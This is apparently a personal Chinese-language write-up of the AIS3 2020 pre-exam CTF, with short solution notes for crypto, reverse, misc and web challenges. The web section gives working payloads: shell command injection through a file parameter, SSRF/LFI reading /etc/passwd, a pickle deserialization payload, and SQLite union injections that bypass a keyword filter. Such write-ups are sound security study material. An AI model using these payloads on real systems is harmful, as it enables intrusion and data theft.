---
title: Ais3_2020_pre_exam_writeup
date: 2020-06-10 11:44:53
tags:
- ais3
- ctf
- writeup
thumbnailImage: https://ais3.org/img/AIS3_LOGO-02.png
thumbnailImagePosition: right
---

- 有一些題目跟去年一樣，應該是配合My-first-ctf吧
- 跟去年比起來，我覺得自己成長蠻多的，覺得去年der我是菜雞
- 放一下scoreboard紀錄一下，我是halloworld
	- https://i.imgur.com/YPUe7VZ.jpg

<!-- excerpt -->

# AIS3-2020-pre-exam

## Crypto

- 🦕Brontosaurus
	- [jsfuck](https://blog.techbridge.cc/2016/07/16/javascript-jsfuck-and-aaencode/)
	- 這題很像跟去年一樣，把整體字串顛倒過來拿去chrome的console執行就可以了
	- 有online-tool
		- https://codebeautify.org/reverse-string

- 🦖 T-Rex
	- 這題是程式競賽吧X
	- 就寫腳本
		- https://pastebin.com/2STiQQXv

- 🐙 Octopus
	- 關鍵字是BB84，量子加密
		- https://zh.wikipedia.org/wiki/%E9%87%8F%E5%AD%90%E5%AF%86%E9%91%B0%E5%88%86%E7%99%BC
	- 已知對方的basis與量子偏振，可與自己的相比較，得出共有的key
	- `print(int(bit_stream[:400],2) ^ FLAG)`
		- 又知道key(取了後面400個bit)跟flag做xor的結果，透過XOR的交換率能知道結果
		- [script](https://pastebin.com/JvsHaTW4)
	- 李永樂老師影片蠻淺顯易懂的
		- https://www.youtube.com/watch?v=dgNyGjwwYpk

## misc

- 💤Piquero
	- 點字，工人智慧題目
	- 啾啾鞋的影片有介紹過哦
		- https://www.youtube.com/watch?v=1aop1ursHVE

- 🐥Karuego
	- 加密文件的明文攻擊
	- 參考自(https://blog.csdn.net/hustcw98/article/details/82392993)
	1. 用`binwalk -e`能夠將檔案與圖片切開
	2. 偽造一個壓縮檔，將已知的圖片壓縮(**請利用linux-zip壓縮，windows會爛**)，google能找到
		- https://pm1.narvii.com/6182/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg
	3. 設定好pkcrack然後破解

- 🌱Soy
	- QR_code修復，點到眼睛脫窗，然後Extract QR Information
	- ref: https://blog.xiafeng2333.top/ctf-13/
	- tool: https://merricx.github.io/qrazybox/
	- 找完der結果
		- ![](https://i.imgur.com/hM1J6Hs.png)

- 👑Saburo
	- 輸入正確字元時間會較高，錯誤則較低
	- 寫腳本爆破，每個字元做五次取平均，pwntools真香，爆了2小時
		- https://pastebin.com/kEzTjP3u

- 👿Shichirou
	- 這題得構造一個tar檔案，tar檔案必須size小於65536
	- 為了讓出來的讓sha1值一樣，必須link-file(從guess.txt連到../flag.txt)by pass，來繞過這段
		```python=
		a = subprocess.check_output(['/usr/bin/sha1sum', 'flag.txt'])
		b = subprocess.check_output(['/usr/bin/sha1sum', os.path.join(outdir, 'guess.txt')])
		```
	- pwntools真香
		- https://pastebin.com/RfJPeLLn
	- [LinuxTool-ln](https://www.opencli.com/linux/ln-create-link-command)

## Reverse

- 🍍TsaiBro
	- 這題也是之前的，打開ida或ghidra，能拿到表與規則
	- 規則則是敲打密碼
		- [tap-code](https://en.wikipedia.org/wiki/Tap_code)

- 🎹Fallen Beat
	- java逆向
	- 利用[jadx-GUI](https://github.com/skylot/jadx/releases)查看邏輯，修改邏輯請用[jbe](https://set.ee/jbe/)
	- 可以發現裡面有`setvalue()`，將MaxCombo跟total改成0，進行patch
		- 拆包
			- `jar -xf  Fallen_Beat.jar`
		- 更新jar裡元素
			- `jar -uf Fallen_Beat.jar Control/GameControl.class`
	- 等三分鐘就有flag，如果是windows的用戶，通常會有解析度導致flag出不來，可以透過patch視窗大小來調整
	- 不過後來想想很像可以直接把生flag那段code拿來執行就好了
	- ref: https://www.talksinfo.com/how-to-edit-class-file-from-a-jar/

- 🧠 Stand up!Brain
	- [brainfuck](https://zh.wikipedia.org/zh-tw/Brainfuck)
	- ida或ghidra理一下邏輯，結果發現裡面有一段brainfuck
	- 然後在路邊撿到一段能翻brainfuck的c_code
		- https://gist.github.com/maxcountryman/1699708


## Web

- 🐿️Squirrel
	- F12看一下，能夠撿到api`https://squirrel.ais3.org/api.php?get=%2Fetc%2Fpasswd`
	- 於是我們拿api的code
		- `?get=./api.php`
	- 然後發現shell_exec，是個command-injection
		- `$output = shell_exec(\"cat '$file'\");\n`
		- `';ls /;'`
	- `5qu1rr3l_15_4_k1nd_0f_b16_r47.txt`
		- `';cat /5qu1rr3l_15_4_k1nd_0f_b16_r47.txt;'`
- 🦈Shark
	- 這題去年出過，SSRF+LFI
	- LFI(file:///)，讀取linux敏感檔案，查看內網ip
		- http://wp.blkstone.me/2018/06/abusing-arbitrary-file-read/#421
	- `https://shark.ais3.org/?path=http://172.22.0.2/flag`

- 🐘Elephant
	- 要先想到`.git`
	- 利用[git-dumper](https://github.com/internetwache/GitTools)把code dump下來
	- 發現source code
		- php-deserialize
		- 利用strcmp的缺陷，去構造陣列比較
			```php=
			<?php
			class User{
			    public $name, $token;
			    function __construct($name, $token) {
			        $this->name = $name;
			        $this->token = $token;
			    }
			    function canReadFlag() {
			        return strcmp($flag, $this->token) == 0;
			    }
			}
			$arr = array();
			$tmp = new User('AAA', $aaa);
			echo base64_encode(serialize($tmp));
			```


- 🐍Snake
	- python pickle的反序列化，一樣構造
	- 參考自: https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#/5/9
	- script
		```py=
		import os
		import pickle
		import base64
		class A(object):
			def __reduce__(self):
				return (eval, ("open('/flag').read()",))
		print(base64.b64encode(pickle.dumps(A())))
		```

- 🦉Owl
	- 登入admin/admin，看source-code有source
		- `<h3 class="text-center text-white pt-5"><a style="color: white" href="/?source">SHOW HINT</a></h3>`
	- sqlite的sqli
	- 過濾方式，把東西寫三次繞過，最後用分號切開語句，後面接註解
		```
        $bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--'];
        $username = str_ireplace($bad, '', $username);
        $username = str_ireplace($bad, '', $username);
        ```
    - payload
    	- 先猜column(發現有3個)
    	```
    	'///*******///uniuniuniononon///******///selselselectectect///******///1///******///,2///******///,3;///******
    	```
    	- 查表，看column
    	```
    	'///*******///uniuniuniononon///******///selselselectectect///******///1///******///,group_concat(sql)///******///,3///******///frfrfromomom///******///sqlite_master;///******
    	```
    	-查garbage，就有flag嘞
    	```
    	'///*******///uniuniuniononon///******///selselselectectect///******///1///******///,group_concat(name||value)///******///,3///******///frfrfromomom///******///garbage;///***
    	```

## Pwn

- 👻 BOF
	- 就buffer-overflow，去年初過